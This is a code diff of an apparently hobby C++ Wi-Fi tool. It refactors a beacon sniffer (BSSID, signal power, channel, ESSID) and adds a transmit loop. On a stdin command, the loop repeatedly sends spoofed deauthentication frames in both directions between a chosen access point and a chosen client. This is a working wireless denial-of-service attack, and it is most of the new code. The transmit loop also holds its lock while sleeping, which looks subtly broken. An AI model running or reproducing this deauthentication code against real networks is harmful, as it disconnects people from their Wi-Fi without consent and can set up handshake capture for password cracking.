@@ -4,6 +4,7 @@
 #include "radiotap.h"
 #include "wireless.h"
 
+
 Runner::Runner()
 {
     isRunning = false;
@@ -14,7 +15,56 @@ Runner::~Runner()
     stop();
 }
 
-void Runner::run(const std::string& dev)
+void setStdinNonBlock()
+{
+    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
+    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
+}
+
+void Runner::TXloop()
+{
+    int deauthCounter = 0;
+    while(isRunning)
+    {
+        ST_IPC_CMD cmd;
+        std::lock_guard<std::mutex> lock(cmdMutex);
+        cmd = currentCmd;
+        uint32_t logCount = 100;
+
+        if(cmd.action == 2)
+        {
+            // 1. AP -> STATION
+            ST_DEAUTH_PACKET pktAtoS;
+            pktAtoS.wl = getStDeauth(currentCmd.target_ap, currentCmd.target_st);
+            pcap_sendpacket(pcap, (const u_char*)&pktAtoS, sizeof(pktAtoS));
+
+            // 2. STATION -> AP
+            ST_DEAUTH_PACKET pktStoA;
+            pktStoA.wl = getApDeauth(currentCmd.target_ap, currentCmd.target_st);
+            pcap_sendpacket(pcap, (const u_char*)&pktStoA, sizeof(pktStoA));
+
+            deauthCounter++;
+            if(deauthCounter % logCount == 0)
+            {
+                ST_IPC_EVENT log;
+                memset(&log, 0, sizeof(ST_IPC_EVENT));
+                log.type = 1;
+                snprintf(log.message, sizeof(log.message), "Deauth sent: %d", deauthCounter);
+                std::lock_guard<std::mutex> outLock(outMutex);
+                fwrite(&log, sizeof(ST_IPC_EVENT), 1, stdout);
+                fflush(stdout);
+            }
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+        else
+        {
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }
+    }
+}
+
+void Runner::RXloop(const std::string& dev)
 {
     isRunning = true;
     device = dev;
@@ -28,12 +78,27 @@ void Runner::run(const std::string& dev)
         return;
     }
 
+    // DEAUTH
+    setStdinNonBlock();
+    memset(&currentCmd, 0, sizeof(ST_IPC_CMD));
+    TXthread = std::thread(&Runner::TXloop, this);
+
     struct pcap_pkthdr* header;
     const u_char* packet;
     int res;
 
-    while(isRunning==true)
+    while(isRunning)
     {
+        ST_IPC_CMD cmd;
+        int readBytes = read(STDIN_FILENO, &cmd, sizeof(ST_IPC_CMD));
+        if(readBytes == sizeof(ST_IPC_CMD))
+        {
+            std::lock_guard<std::mutex> lock(cmdMutex);
+            currentCmd = cmd;
+            if (currentCmd.action == 4) break;
+        }
+
+        // Sniffing
         res = pcap_next_ex(pcap, &header, &packet);
         if(res == 0) continue; // 타임아웃
         if(res == -1 || res == -2) break; // error, breakloop
@@ -46,36 +111,31 @@ void Runner::run(const std::string& dev)
         if (!chkBeacon(wl)) continue;
 
         ST_INFO info;
-        info.BSSID = prtMac(wl.bssid);
+        memset(&info, 0, sizeof(ST_INFO));
+        prtMac(info.bssid, sizeof(info.bssid), wl.bssid);
 
         ST_BC_COMMON bc = capBc(packet + rdt.len + wirelessLen);
         uint64_t bcLen = sizeof(bc);
 
         const u_char* tagStart = (packet + rdt.len + wirelessLen + bcLen);
-        info.ESSID = getEssid(tagStart, (header->caplen) - rdt.len - wirelessLen - bcLen);
+        // getEssid -> TAG 0이 없으면 false, 있으면 true
+        if(!getEssid(info.essid, sizeof(info.essid), tagStart, (header->caplen) - rdt.len - wirelessLen - bcLen))
+        {
+            continue;
+        }
 
-        std::map<std::string, int> rdtInfo = getRdtInfo(packet, &rdt, presentCount(packet));
-        if(rdtInfo["PWR"] != 999) info.PWR = std::to_string(rdtInfo["PWR"]);
-        if(rdtInfo["CH"] != 0) info.CH = std::to_string(rdtInfo["CH"]);
+        ST_RDT_DATA rdtData = getRdtInfo(packet, &rdt, presentCount(packet));
+        if(rdtData.pwr != 999) info.pwr = static_cast<int16_t>(rdtData.pwr);
+        if(rdtData.ch != 0) info.ch = static_cast<int16_t>(rdtData.ch);
 
-        /* TEST
-        char logBuf[512];
-        snprintf(logBuf, sizeof(logBuf), "BSSID: %s\tPWR: %s\tCH: %s\tESSID: %s",
-                 info.BSSID.c_str(), info.PWR.c_str(), info.CH.c_str(), info.ESSID.c_str());
-        TRACE(std::string(logBuf));
-        */
-
-        printf("BSSID: %s\tPWR: %s\tCH: %s\tESSID: %s\n",
-               info.BSSID.c_str(), info.PWR.c_str(), info.CH.c_str(), info.ESSID.c_str());
-
+        std::lock_guard<std::mutex> outLock(outMutex);
+        fwrite(&info, sizeof(ST_INFO), 1, stdout);
         fflush(stdout);
     }
-
+    isRunning = false;
+    if(TXthread.joinable()) TXthread.join();
     pcap_close(pcap);
     pcap = nullptr;
-
-
-    // 파싱 로직 구현
 
 }
 
